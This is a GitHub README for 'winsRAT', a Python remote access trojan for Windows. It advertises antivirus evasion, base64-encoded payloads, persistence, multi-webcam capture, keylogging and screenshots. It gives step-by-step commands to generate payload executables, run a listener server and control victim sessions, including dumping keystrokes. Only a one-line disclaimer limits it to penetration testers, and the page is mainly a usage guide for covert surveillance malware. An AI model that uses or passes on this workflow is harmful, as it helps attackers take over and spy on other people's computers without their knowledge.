<h1 align="center"> 
    <img src="https://user-images.githubusercontent.com/29171692/89164677-00e3e480-d595-11ea-9cf1-f27ab1faf432.png" alt="winsRAT" /> <br>    
    winsRAT Under continuous development (Beta winsRAT)
</h1>
<p align="center">
    <a href="https://www.python.org/" target="_blank"><img src="https://img.shields.io/badge/Python-3-yellow.svg?logo=python" alt="Python: 3" /></a>
    <a href="https://github.com/ThemeHackers/winsRAT/releases" target="_blank"><img src="https://img.shields.io/badge/version-v2.1-blue.svg?logo=moo" alt="Release: v3.1" /></a>
    <a href="https://opensource.org/license/gpl-3-0" target="_blank"><img src="https://img.shields.io/badge/license-GPL-green.svg" alt="lisence" /></a>
</p>
<h4 align="center">Windows RAT</h4>

## Getting Started
### Description
winsRAT is written entirely in Python, developed from SillyRAT. winsRAT is a RAT specifically for Windows operating systems and has additional features. Server.py can generate two types of files: .exe files and source files.

### Features
This image shows the features of the tool.

And others, stay tuned.

### High-level features

- Avoid AV
- The payload is base64 encoded.
- The webcam module is developed to capture images of multiple devices on the connected target machine. For example, if the target machine has 5 webcams, this module will capture images of all 5 devices immediately when using the webcam command on the server.
- Reconnecting to increase retention
- And others, stay tuned.

### Installation
The tool is tested on **Windows** with **Python 3.13.4**. 
Follow the steps for installation:
```
$ git clone https://github.com/ThemeHackers/winsRAT
$ cd winsRAT/
$ pip3 install -r requirements.txt
```

## Documentation
### Generating Payload
You can get the payload file in two ways: 
<ul>
    <li>Source File</li>
    <li>Compiled File</li>
</ul>

Source file

```
$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}" -s -per
$ python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\winsrat" -s -per
```
Compiled file

```
$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}"
$ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
```

Replace your IP Address and Port on above commands. 

### Running Server
The server must be executed on Windows. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
```
$ python3 server.py bind -a 0.0.0.0 -p 9001
```

### Connections
All the connections will be listed under **sessions** command:
```
$ sessions
```

You can connect to you target session with **connect** command and launch one of available commands: 
```
$ connect ID
$ keylogger on
$ keylogger dump
$ screenshot
```

### Help
Get a list of available commands: 
```
$ help
```

Help on a Specific Command:
```
$ help COMMAND
```

### Credit
Twitter: <a href="//twitter.com/hash3liZer">@hash3liZer</a><br>
Discord: TheFlash2k#0407

### Support the improvement 
Instagram: <a href="https://www.instagram.com/_tthemzdl5678/">_tthemzdl5678</a><br>
Github: <a href="https://github.com/ThemeHackers/">ThemeHackers</a><br>
### Disclaimer
This tool is only for use by penetration testers or security testers. The author is not responsible for any illegal actions in your country.
